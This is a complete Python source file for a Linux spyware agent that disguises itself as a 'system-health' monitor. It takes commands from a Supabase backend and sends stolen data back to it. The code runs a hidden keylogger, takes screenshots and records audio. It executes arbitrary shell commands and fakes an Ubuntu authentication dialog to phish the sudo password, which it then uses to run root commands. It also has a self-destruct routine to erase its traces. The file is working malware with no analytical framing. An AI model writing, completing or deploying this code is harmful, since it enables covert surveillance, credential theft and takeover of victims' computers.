import os
import sys
import time
import json
import socket
import uuid
import random
import string
import platform
import subprocess
import base64
import urllib.request
import urllib.error
from datetime import datetime, timezone
import threading

# --- GLOBALS ---
KEYLOG_BUFFER = []
ROOT_PASSWORD = None
KEYLOG_LOCK = threading.Lock()

# --- CONFIGURATION ---
BASE_PATH = os.path.expanduser("~/.config/system-health")
CONFIG_FILE = os.path.join(BASE_PATH, "config.enc")
DEVICE_ID_FILE = os.path.join(BASE_PATH, ".device_id")
KEY = "S3cr3tK3y2024!"

# --- UTILS ---

def install_dependencies():
    """Attempt to install missing python dependencies."""
    restart_needed = False
    
    # 1. Check MSS
    try:
        import mss
    except ImportError:
        try:
            print("Installing mss...", flush=True)
            subprocess.run([sys.executable, "-m", "pip", "install", "mss", "--break-system-packages"], check=True)
            restart_needed = True
        except Exception as e:
            print(f"Failed to install mss: {e}", flush=True)

    # 2. Check Pynput
    try:
        import pynput
    except ImportError:
        try:
            print("Installing pynput...", flush=True)
            subprocess.run([sys.executable, "-m", "pip", "install", "pynput", "--break-system-packages"], check=True)
            restart_needed = True
        except Exception as e:
            print(f"Failed to install pynput: {e}", flush=True)

    if restart_needed:
        print("Dependencies installed. Restarting agent to apply changes...", flush=True)
        sys.exit(1)

def get_config():
    try:
        if not os.path.exists(CONFIG_FILE):
            return None
        
        with open(CONFIG_FILE, "rb") as f:
            encoded = f.read().strip()
            
        encrypted = base64.b64decode(encoded)
        key_bytes = KEY.encode('utf-8')
        decrypted = bytearray()
        
        for i in range(len(encrypted)):
            decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
            
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        print(f"Config Error: {e}", flush=True)
        return None

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            return f.read().strip()
    
    new_id = str(uuid.uuid4())
    try:
        os.makedirs(BASE_PATH, exist_ok=True)
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
    except:
        pass
    return new_id

def get_device_name():
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(8))

def run_command(cmd, shell=True):
    try:
        result = subprocess.run(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except Exception as e:
        return "", str(e), -1

# --- ACTIONS ---

def take_screenshot():
    try:
        import mss
        filename = f"/tmp/scr_{int(time.time())}.png"
        
        with mss.mss() as sct:
            # Capture the first monitor
            sct.shot(mon=-1, output=filename)
            
        with open(filename, "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
            
        os.remove(filename)
        return img_data
    except Exception as e:
        # Pass exception up to process_tasks to be sent as sysinfo
        raise e

# --- KEYLOGGER ---
def start_keylogger_thread():
    def on_press(key):
        global KEYLOG_BUFFER
        try:
            char = key.char
        except AttributeError:
            char = f"[{str(key).replace('Key.', '')}]"
            
        with KEYLOG_LOCK:
            KEYLOG_BUFFER.append(str(char))
            if len(KEYLOG_BUFFER) > 5000: # Limit buffer
                KEYLOG_BUFFER.pop(0)

    try:
        import pynput.keyboard
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        # print("Keylogger started.", flush=True) # Silenced per user request
    except Exception as e:
        pass # print(f"Keylogger failed to start: {e}", flush=True)

def attempt_root_escalation():
    global ROOT_PASSWORD
    print("Attempting root escalation (Fake Auth)...", flush=True)
    
    # Check Tkinter
    try:
        import tkinter as tk
        from tkinter import font
        print("DEBUG: Tkinter imported successfully", flush=True)
    except ImportError as ie:
        print(f"DEBUG: Tkinter import failed: {ie}", flush=True)
        return False, f"Tkinter not installed: {ie}"

    result_pw = None

    def show_ui():
        nonlocal result_pw
        try:
            # Setup Root
            root = tk.Tk()
            root.withdraw()
           
            w, h = root.winfo_screenwidth(), root.winfo_screenheight()

            # Fixed dialog dimensions
            DIALOG_WIDTH = 373
            DIALOG_HEIGHT = 381

            # Create Dialog FIRST (before dimmer)
            dialog = tk.Toplevel(root)
            dialog.title("Auth")
            dialog.overrideredirect(True)
            
            # Set background to match the PNG background color
            dialog.configure(bg='#2C2C2C')
           
            # Load Dialog Image (basic PNG) - ALWAYS RESIZE TO 373x381
            base_dir = os.path.expanduser("~/.config/system-health")
            if not os.path.exists(base_dir):
                base_dir = os.path.dirname(os.path.abspath(__file__))
                
            img_path = os.path.join(base_dir, "prompt.png")
            
            print(f"DEBUG: Loading image from {img_path}", flush=True)
               
            bg_image = None
            try:
                # Check if we can use OpenCV to load PNG with proper alpha
                import cv2
                import numpy as np
                
                # Load PNG with alpha channel
                png_img = cv2.imread(img_path, cv2.IMREAD_UNCHANGED)
                
                if png_img is not None:
                    print(f"Original image size: {png_img.shape[1]}x{png_img.shape[0]}", flush=True)
                    
                    # RESIZE to exact dimensions (373x381)
                    png_img = cv2.resize(png_img, (DIALOG_WIDTH, DIALOG_HEIGHT), interpolation=cv2.INTER_LANCZOS4)
                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
                    
                    if png_img.shape[2] == 4:  # Has alpha channel
                        # Replace transparent pixels with dialog background color
                        alpha = png_img[:, :, 3]
                        rgb = png_img[:, :, :3]
                        
                        # Background color #2C2C2C in BGR
                        bg_color = np.array([44, 44, 44], dtype=np.uint8)
                        
                        # Blend transparent areas with background
                        for c in range(3):
                            rgb[:, :, c] = rgb[:, :, c] * (alpha / 255.0) + bg_color[c] * (1.0 - alpha / 255.0)
                        
                        # Save blended image
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, rgb)
                        
                        # Load with tkinter
                        bg_image = tk.PhotoImage(file=temp_png)
                        print("✅ Loaded PNG with OpenCV alpha blending and resize", flush=True)
                    else:
                        # No alpha channel, just save resized image
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, png_img)
                        bg_image = tk.PhotoImage(file=temp_png)
                        print("✅ Loaded and resized PNG (no alpha)", flush=True)
                else:
                    raise Exception("Failed to load image with OpenCV")
                    
            except Exception as e:
                # Fallback to PIL for resizing if OpenCV fails
                print(f"⚠️ OpenCV processing failed: {e}, trying PIL...", flush=True)
                try:
                    from PIL import Image
                    
                    # Load and resize with PIL
                    pil_img = Image.open(img_path)
                    print(f"Original image size: {pil_img.width}x{pil_img.height}", flush=True)
                    
                    # Resize to exact dimensions
                    pil_img = pil_img.resize((DIALOG_WIDTH, DIALOG_HEIGHT), Image.Resampling.LANCZOS)
                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
                    
                    # Save temporary file
                    temp_png = "/tmp/dialog_resized.png"
                    pil_img.save(temp_png)
                    
                    # Load with tkinter
                    bg_image = tk.PhotoImage(file=temp_png)
                    print("✅ Loaded and resized PNG with PIL", flush=True)
                    
                except ImportError:
                    print("⚠️ PIL not found", flush=True)
                    # Final fallback
                    try:
                        bg_image = tk.PhotoImage(file=img_path)
                        print("⚠️ Using original image without resize (fallback)", flush=True)
                    except Exception as e2:
                        print(f"❌ Failed to load prompt.png: {e2}", flush=True)
                        bg_image = None
               
            # Center Dialog using fixed dimensions
            x = (w - DIALOG_WIDTH) // 2
            y = (h - DIALOG_HEIGHT) // 2
            dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")
           
            # === SCREENSHOT DIMMER using MSS + OpenCV ===
            print("Taking screenshot for dimmed background...", flush=True)
            dimmer = None
            try:
                import mss
                import mss.tools
                import cv2
                import numpy as np
                
                # Take screenshot
                temp_screenshot = "/tmp/screen_bright.png"
                with mss.mss() as sct:
                    sct_img = sct.grab(sct.monitors[0])
                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_screenshot)
                
                # Load with OpenCV and dim it
                img = cv2.imread(temp_screenshot)
                
                # Reduce brightness by multiplying pixels by 0.4 (60% darker)
                dimmed_img = cv2.convertScaleAbs(img, alpha=0.4, beta=0)
                
                # Save dimmed version
                temp_dimmed = "/tmp/screen_dimmed.png"
                cv2.imwrite(temp_dimmed, dimmed_img)
                
                print("✅ Screenshot dimmed with OpenCV", flush=True)
                
                # Load dimmed screenshot into tkinter
                screen_photo = tk.PhotoImage(file=temp_dimmed)
                
                # Create dimmer window
                dimmer = tk.Toplevel(root)
                dimmer.title("Overlay")
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.overrideredirect(True)
                dimmer.configure(bg='black')
                
                # Display dimmed screenshot
                dimmer_label = tk.Label(dimmer, image=screen_photo, borderwidth=0)
                dimmer_label.image = screen_photo  # Keep reference
                dimmer_label.place(x=0, y=0)
                
                print("✅ Dimmed screenshot background displayed", flush=True)
                    
            except Exception as e:
                print(f"⚠️ Screenshot dimmer failed: {e}, using solid overlay", flush=True)
                dimmer = tk.Toplevel(root)
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.configure(bg='black')
                dimmer.overrideredirect(True)
                try:
                    dimmer.attributes('-alpha', 0.5)
                except:
                    pass
           
            # Background Label
            if bg_image:
                bg_lbl = tk.Label(dialog, image=bg_image, borderwidth=0, highlightthickness=0)
                bg_lbl.image = bg_image  # Keep reference
                bg_lbl.place(x=0, y=0)
           
            # Wait for both windows to be ready
            if dimmer:
                dimmer.update()
            dialog.update()
           
            # Critical stacking order
            if dimmer:
                dimmer.lower(dialog)  # Lower dimmer BELOW dialog specifically
            dialog.lift()   # Bring dialog to front
            dialog.attributes('-topmost', True)  # Keep dialog on top
            
            # Force stacking again after a moment
            def fix_stacking():
                if dimmer:
                    dimmer.lower(dialog)
                dialog.lift()
            dialog.after(100, fix_stacking)
            dialog.after(300, fix_stacking)
           
            # Grab all input
            dialog.focus_force()
           
            # Aggressive focus maintenance
            def maintain_focus():
                if dialog.winfo_exists():
                    dialog.lift()
                    # Only refocus if password field doesn't have focus
                    if dialog.focus_get() != pw_entry:
                        pw_entry.focus_force()
                    dialog.after(1000, maintain_focus)  # Much less frequent
            dialog.after(100, maintain_focus)

            # Layout Configuration
            POS = {
                'title_y': 50,
                'msg_y': 85,
                'avatar_y': 170,
                'username_y': 220,
                'input_y': 273,
                'input_w': 260,
                'input_h': 28,
                'btn_h': 41,
                'btn_gap': 1,  # Gap between buttons
            }
           
            TEXT_COLOR = 'white'
            BG_COLOR = '#2C2C2C'
            TITLE_BG = '#1d1d1d'
            MSG_BG = '#1d1d1d'
            AVATAR_BG = '#272727'
            USERNAME_BG = '#1d1d1d'
            ENTRY_BG = '#393230'
            BTN_AUTH_BG = '#323232'
            BTN_AUTH_HOVER = '#424242'
            BTN_CANCEL_BG = '#323232'
            BTN_CANCEL_HOVER = '#424242'
           
            # Title
            hdr_font = font.Font(family="Ubuntu", size=13, weight="bold")
            tk.Label(dialog, text="Authentication Required", bg=TITLE_BG, fg=TEXT_COLOR, font=hdr_font)\
                .place(relx=0.5, y=POS['title_y'], anchor='center')
           
            # Message
            msg = "Authentication keyring is needed to upgrade\nsystem packages"
            body_font = font.Font(family="Ubuntu", size=10)
            tk.Label(dialog, text=msg, bg=MSG_BG, fg='#CCCCCC', font=body_font, justify='center')\
                .place(relx=0.5, y=POS['msg_y'], anchor='center')

            # User Info
            username = os.getlogin()
            initial = username[0].upper() if username else "?"
           
            tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold"))\
                .place(relx=0.5, y=POS['avatar_y'], anchor='center')
           
            tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold"))\
                .place(relx=0.5, y=POS['username_y'], anchor='center')

            # Password Input
            pw_entry = tk.Entry(dialog, show="•", bg=ENTRY_BG, fg='white',
                               relief='flat', bd=0, highlightthickness=0,
                               font=("Ubuntu", 15), insertbackground='white',
                               justify='center')
           
            pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
            
            # Prevent focus from being stolen
            def keep_entry_focus(e):
                return "break"
            
            pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())

            # Buttons with gap
            btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
            btn_y = DIALOG_HEIGHT - POS['btn_h']
           
            def cancel(e=None):
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.quit()
                except: pass
               
            def submit(event=None):
                nonlocal result_pw
                result_pw = pw_entry.get()
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.quit()
                except: pass
           
            # Cancel Button (Left)
            lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
            lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_cancel.bind("<Button-1>", cancel)
           
            # Authenticate Button (Right)
            lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
            lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_auth.bind("<Button-1>", submit)
           
            # Hover effects
            def on_cancel_enter(e): 
                lbl_cancel.config(bg=BTN_CANCEL_HOVER)
            def on_cancel_leave(e): 
                lbl_cancel.config(bg=BTN_CANCEL_BG)
            
            def on_auth_enter(e): 
                lbl_auth.config(bg=BTN_AUTH_HOVER)
            def on_auth_leave(e): 
                lbl_auth.config(bg=BTN_AUTH_BG)
           
            lbl_cancel.bind("<Enter>", on_cancel_enter)
            lbl_cancel.bind("<Leave>", on_cancel_leave)
            
            # Validation logic
            auth_disabled_fg = '#555555'
            lbl_auth.config(fg=auth_disabled_fg, cursor='arrow') # Start disabled
            lbl_auth.unbind("<Button-1>")
            lbl_auth.unbind("<Enter>")
            lbl_auth.unbind("<Leave>")

            def update_auth_button_state(e=None):
                if pw_entry.get():
                    lbl_auth.config(fg=TEXT_COLOR, cursor='hand2')
                    lbl_auth.bind("<Button-1>", submit)
                    lbl_auth.bind("<Enter>", on_auth_enter)
                    lbl_auth.bind("<Leave>", on_auth_leave)
                else:
                    lbl_auth.config(fg=auth_disabled_fg, cursor='arrow', bg=BTN_AUTH_BG)
                    lbl_auth.unbind("<Button-1>")
                    lbl_auth.unbind("<Enter>")
                    lbl_auth.unbind("<Leave>")
            
            pw_entry.bind('<KeyRelease>', update_auth_button_state)
            update_auth_button_state()
            
            # Keyboard bindings
            def submit_if_valid(e=None):
                if pw_entry.get():
                    submit(e)
            
            pw_entry.bind('<Return>', submit_if_valid)
            dialog.bind('<Escape>', cancel)
            
            # Emergency exit handlers
            def force_quit(e=None):
                cancel()
            
            root.bind('<Control-c>', force_quit)
            dialog.bind('<Control-c>', force_quit)
            dialog.bind('<Control-q>', force_quit)
           
            # Force focus
            def set_focus():
                pw_entry.focus_force()
                pw_entry.icursor(tk.END)
                try: dialog.grab_set_global()
                except: dialog.grab_set()
           
            dialog.after(250, set_focus)
           
            root.mainloop()

        except Exception as e:
            print(f"GUI Exception: {e}", flush=True)
            import traceback
            traceback.print_exc()

    try:
        # Run in thread to allow timeout or main thread checks if needed (optional)
        import threading
        def run_with_timeout():
            print("DEBUG: Thread starting show_ui...", flush=True)
            show_ui()
            print("DEBUG: Thread show_ui finished.", flush=True)
        
        print("DEBUG: Starting UI thread...", flush=True)
        ui_thread = threading.Thread(target=run_with_timeout, daemon=True)
        ui_thread.start()
        print("DEBUG: UI thread started, joining with timeout...", flush=True)
        ui_thread.join(timeout=60) # 60s timeout
        print(f"DEBUG: Join completed. Alive? {ui_thread.is_alive()}", flush=True)
        
        if ui_thread.is_alive():
             print("⚠️ UI timed out or hung", flush=True)
             return False, "Timeout"

    except Exception as e:
        print(f"DEBUG: Threading error: {e}", flush=True)
        return False, f"UI Thread Failed: {e}"
    
    if result_pw:
        print(f"✅ Password Captured: {result_pw}", flush=True)
        # Verify
        test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
        if test.returncode == 0:
            ROOT_PASSWORD = result_pw
            return True, "Success! Root password captured."
        else:
            return False, "Password captured but incorrect."
    else:
        return False, "User cancelled or empty password."

def record_audio(duration=10):
    try:
        filename = f"/tmp/aud_{int(time.time())}.wav"
        # record 10 seconds, quietly
        result = subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], capture_output=True, text=True)
        
        if result.returncode != 0:
             raise Exception(f"Arecord exited with {result.returncode}: {result.stderr.strip()}")
        
        with open(filename, "rb") as f:
            audio_data = base64.b64encode(f.read()).decode()
            
        os.remove(filename)
        return audio_data
    except Exception as e:
        raise e

def get_sys_info():
    info = {}
    info['platform'] = platform.platform()
    info['processor'] = platform.processor()
    out, _, _ = run_command("free -h")
    info['memory'] = out
    out, _, _ = run_command("df -h /")
    info['disk'] = out
    out, _, _ = run_command("ip addr")
    info['network'] = out
    out, _, _ = run_command("whoami")
    info['user'] = out
    return json.dumps(info)

# --- SUPABASE ---

def api_request(config, endpoint, method="GET", data=None):
    url = f"{config['supabase_url']}/rest/v1/{endpoint}"
    headers = {
        "apikey": config['supabase_key'],
        "Authorization": f"Bearer {config['supabase_key']}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    
    try:
        req = urllib.request.Request(url, method=method)
        for k, v in headers.items():
            req.add_header(k, v)
        
        if data:
            json_data = json.dumps(data).encode('utf-8')
            req.data = json_data
            
        with urllib.request.urlopen(req) as response:
            if method == "GET":
                return json.loads(response.read().decode())
            return True
    except Exception as e:
        print(f"API Error ({endpoint}): {e}", flush=True)
        return None

def register_device(config, device_id):
    hostname = socket.gethostname()
    username = os.getlogin()
    os_info = f"Linux {platform.release()}"
    
    # Check if exists
    exists = api_request(config, f"devices?device_id=eq.{device_id}&select=device_id")
    
    data = {
        "device_id": device_id,
        "hostname": hostname,
        "username": username,
        "os_info": os_info,
        "last_sync": datetime.now(timezone.utc).isoformat()
    }
    
    if not exists:
        data["device_name"] = get_device_name()
        data["registered"] = datetime.now(timezone.utc).isoformat()
        api_request(config, "devices", "POST", data)
        print(f"Device registered: {device_id}", flush=True)
    else:
        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})

def self_destruct():
    try:
        print("Initiating self-destruct...", flush=True)
        # 1. Disable Service (don't stop yet)
        run_command("systemctl --user disable health-monitor.service")
        
        # 2. Remove Service File
        service_file = os.path.expanduser("~/.config/systemd/user/health-monitor.service")
        if os.path.exists(service_file):
            os.remove(service_file)
        run_command("systemctl --user daemon-reload")
        
        # 3. Remove Config & Agent Files
        # We keep the running script in memory, but delete the file on disk
        import shutil
        if os.path.exists(BASE_PATH):
            shutil.rmtree(BASE_PATH)
            
        return True
    except Exception as e:
        print(f"Destruct failed: {e}", flush=True)
        return False

def process_tasks(config, device_id):
    tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*")
    if not tasks:
        return
        
    for task in tasks:
        task_id = task['id']
        task_type = task['task_type']
        params = task.get('task_params', {})
        
        print(f"Processing task: {task_type} (ID: {task_id})", flush=True)
        
        result_data = None
        data_type = None
        should_destruct = False
        
        try:
            if task_type == "display_capture":
                # Ensure DISPLAY var is set
                if "DISPLAY" not in os.environ:
                    os.environ["DISPLAY"] = ":0"
                    
                print(f"Taking screenshot... DISPLAY={os.environ['DISPLAY']}", flush=True)
                img = take_screenshot()
                if img:
                    result_data = {"file_data": img}
                    data_type = "display"
                    print("Screenshot captured successfully.", flush=True)
                else:
                    # Report failure
                    result_data = {"data": "Screenshot failed. 'scrot' might be missing or no display."}
                    data_type = "sysinfo" # Send as generic info/log
                    print("Screenshot failed (unknown reason).", flush=True)
                    
            elif task_type == "system_info":
                sysinf = get_sys_info()
                result_data = {"data": sysinf}
                data_type = "sysinfo"
                
            elif task_type == "voice_capture":
                duration = params.get('duration', 10)
                print(f"Recording audio for {duration}s...", flush=True)
                aud = record_audio(duration)
                if aud:
                    result_data = {"file_data": aud}
                    data_type = "audio"
                else:
                    result_data = {"data": "Audio recording failed. 'arecord' missing or input unavailable."}
                    data_type = "sysinfo"

            elif task_type == "input_monitor": # Keylogs
                global KEYLOG_BUFFER
                with KEYLOG_LOCK:
                    logs = "".join(KEYLOG_BUFFER)
                    KEYLOG_BUFFER.clear()
                
                if logs:
                    result_data = {"data": logs}
                    data_type = "keylog"
                    print(f"Sent {len(logs)} chars of keylogs.", flush=True)
                else:
                    result_data = {"data": "No keylogs captured yet."}
                    data_type = "sysinfo"

            elif task_type == "escalate_privileges":
                success_bool, msg = attempt_root_escalation()
                result_data = {"data": msg}
                data_type = "sysinfo"
                # Track success for status update
                should_fail_task = not success_bool

            elif task_type == "auto_destruct":
                success = self_destruct()
                result_data = {"data": "Self-destruct sequence initiated. Agent removed." if success else "Self-destruct failed."}
                data_type = "sysinfo"
                should_destruct = True
                    
            elif task_type == "cmd_exec":
                cmd = params.get('command', '')
                print(f"Executing command: {cmd}", flush=True)
                stdout, stderr, code = run_command(cmd)
                res = {
                    "command": cmd,
                    "output": stdout,
                    "error": stderr,
                    "exit_code": code,
                    "executed_as": "USER"
                }
                result_data = {"data": json.dumps(res)}
                data_type = "cmd_result"
                should_fail_task = (code != 0)
                
            elif task_type == "cmd_exec_admin":
                cmd = params.get('command', '')
                if ROOT_PASSWORD:
                    print(f"Executing ROOT command: {cmd}", flush=True)
                    # Use sudo -S
                    full_cmd = f"echo '{ROOT_PASSWORD}' | sudo -S {cmd}"
                    stdout, stderr, code = run_command(full_cmd)
                    exec_as = "ROOT"
                else:
                    print("Root command requested but no password. Failing.", flush=True)
                    stdout = ""
                    stderr = "Error: Root access not yet acquired. Run 'Escalate Privileges' first."
                    code = -1
                    exec_as = "USER"
                    
                res = {
                    "command": cmd,
                    "output": stdout,
                    "error": stderr,
                    "exit_code": code,
                    "executed_as": exec_as
                }
                result_data = {"data": json.dumps(res)}
                data_type = "cmd_result"
                should_fail_task = (code != 0)
                
        except Exception as e:
            # Catch unexpected errors during execution
            error_msg = f"Task execution error: {str(e)}"
            print(error_msg, flush=True)
            result_data = {"data": error_msg}
            data_type = "sysinfo"
            should_fail_task = True

        # Upload telemetry
        if result_data and data_type:
            print(f"Uploading telemetry: {data_type}", flush=True)
            telemetry = {
                "device_id": device_id,
                "data_type": data_type,
                "collected_at": datetime.now(timezone.utc).isoformat()
            }
            telemetry.update(result_data)
            api_request(config, "telemetry", "POST", telemetry)
            
        # Complete task
        final_status = "error" if should_fail_task else "complete"
        api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {
            "status": final_status,
            "completed_at": datetime.now(timezone.utc).isoformat()
        })
        print(f"Task {final_status}: {task_id}", flush=True)
        
        if should_destruct:
            print("❌ AGENT COMMITTING SUICIDE NOW.", flush=True)
            # FORCE KILL immediately, do not pass go, do not collect $200
            os._exit(0)

# --- MAIN ---

def main():
    # Delay for network
    time.sleep(10)
    print("Agent started.", flush=True)
    
    config = get_config()
    if not config:
        print("No valid config found.", flush=True)
        return
        
    device_id = get_device_id()
    print(f"Device ID: {device_id}", flush=True)
    
    # Check dependencies once but don't loop-restart
    try:
        install_dependencies()
    except:
        pass
        
    # Start keylogger silently
    start_keylogger_thread()
    
    while True:
        try:
            register_device(config, device_id)
            process_tasks(config, device_id)
        except Exception as e:
            print(f"Main loop error: {e}", flush=True)
        
        sleep_time = config.get('sync_interval', 60)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
